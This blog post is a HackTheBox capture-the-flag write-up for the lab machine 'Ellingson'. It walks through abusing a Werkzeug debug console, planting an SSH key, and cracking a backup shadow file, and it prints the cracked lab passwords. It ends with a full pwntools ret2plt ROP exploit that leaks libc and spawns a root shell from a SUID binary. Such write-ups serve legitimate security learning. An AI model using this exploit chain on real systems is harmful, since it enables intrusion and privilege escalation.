---
title: "HackTheBox - WriteUp 9"
date: 2019-07-04T17:33:14+08:00
description: "HackTheBox 练手"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Ellingson

Nmap first, 80 HTTP Apache and 22 SSH.

## User

Generate a key pair of SSH for preparation.

Check the pages, you'll find URL: http://10.10.10.139/articles/2

Then let the article ID "overflow"ed, then You'll be able to see the debug console of Python Werkzeug.

Use the console to execute shell command, currently logged in as `hal`.

This user `~/.ssh/authorized_keys` is allowed to write, so write the public key you just generated to the `authorized_keys`. Then access it with SSH.

After that, run LinEnum, `/var/backups/shadow.bak` is found and is readable. Access it, crack the hash in it, found another credentials: `margo:iamgod$08` and `plague:password123`

Login as margo, You have the access with `user.txt` now.  `plague` is totally useless here and cannot login.

## Root

Run LinEnum again, found SUID file `/usr/bin/garbage`. Kernel is relatively newer version. So DirtyCow CANNOT be used here.

But the `gdb` is not installed. Check the libc with `ldd /usr/bin/garbage` to get the glibc file path and download both files.

There's a buffer overflow approach with `ret2plt` method.

Before we continue, I strongly suggest you read the following referrence to get the knowledge you may need:

- [ELF 101](https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/)
- [Series Article about ELF](https://www.airs.com/blog/archives/38)
- [PLT & GOT - Code sharing with dynamic libraries](https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html)
- [ippsec: Bitterman On Youtube](https://www.youtube.com/watch?reload=9&v=6S4A2nhHdWg)
- [Arguments passed in a function call in x64 machine](http://6.035.scripts.mit.edu/sp17/x86-64-architecture-guide.html)

Since we know the basic knowledge, `chmod +s ./garbage` we downloaded to simulate the environment.

So next, run `ltrace ./garbage`,  you will find the password it wanted. However, this is totally useless.

So in fact, it is a buffer overflow here.

As my blog post [HTB: Solidstate](/hioscp/2019-htb-writeup5.md) told, just create pattern `pattern create 150`, and insert, then use `info frame`  to get saved %rip , use `pattern offset 0x41416d4141514141` to get : `4702159612987654465 found at offset: 136`.

Run `checksec` first, get ASLR fully-enabled and 64-bit Kernel with NX enabled, RELRO partial.

Since this is x64 machine, we cannot use bruteforce to crack the libc base address. We have to use `ret2plt` here. About the finding of specific function address, check the comment in the next file, finally, the exploit as here:

```python
#!/usr/bin/env python2

from pwn import *

# this program must be initiated with UID 1002, told by IDA reverse.

context(os="linux", arch="amd64")   # amd64 = x64 little-endian, ia64 = x64 big-endian
context.log_level = 'DEBUG'
libc = ELF("./r_libc.so.6")
session = ssh("margo", "10.10.10.139", password="iamgod$08")
p = session.process('/usr/bin/garbage')

#p = gdb.debug('./garbage')

junk = "\x90" * 136

# Stage 1: pop-ret-rdi get libc base
# Find the pop_rdi via radare2(BUT BUGS HERE, SO USE ROPPER INSTEAD):  r2 ./garbage -> /R blahblah
# Disassemble the ELF and find function: odjdump -D ./garbage | grep blahblah
# Disassemble the ELF and find PLT: objdump -d ./garbage -j .plt
# Find the pop_rdi via ropper: ropper -f ./garbage --search "pop rdi" 
# Outupt of puts disassembled via objdump (the contents inside [] is also comments):  [Linked Call Address in Binary]  401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 [Address in GOT] <puts@GLIBC_2.2.5>

plt_puts = p64(0x401050)
got_puts = p64(0x404028)
pop_rdi = p64(0x40179b)
plt_main = p64(0x401619)

# x86_64 put all args in registers instead of stack in memory
# pop_rdi used to send params to system function call

# get the puts address in GOT
# the ELF working procedure is: load library -> relocation, call function via PLT stub -> patch the GOT table with address the libraries loaded in 
# payload1 will give you the address puts@GLIBC loaded in at runtime in GOT
payload1 = junk + pop_rdi + got_puts + plt_puts + plt_main

p.sendline(payload1)
p.recvuntil("access denied.")

# Receive the result and only accept the first 8 bytes(64 bits), remove the LF
# If length != 8, left-justify it to 8 bytes and use the padding of \x00
leaked_puts = p.recv()[:8].strip().ljust(8, "\x00")

log.success("Leaked puts@GLIBC: " + str(leaked_puts))

# Stage 2: according to base, get the offset

# Get the related function address of so file
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh

leaked_puts = u64(leaked_puts)
libc_puts = libc.symbols['puts']
libc_base = leaked_puts - libc_puts
libc_system = libc.symbols['system']
libc_sh = libc.search('/bin/sh').next()
libc_setuid = libc.symbols['setuid']

# Param of setuid(0)
nullparam = p64(0x0)

# Function addresses in the garbage at runtime
systemAddr = p64(libc_base + libc_system)
shAddr = p64(libc_base + libc_sh)
setuidAddr = p64(libc_base + libc_setuid)

# setuid(0) + system('/bin/sh')
payload2 = junk + pop_rdi + nullparam + setuidAddr + pop_rdi + shAddr + systemAddr

p.sendline(payload2)
p.recvuntil("access denied.")

p.interactive()
```

(END)
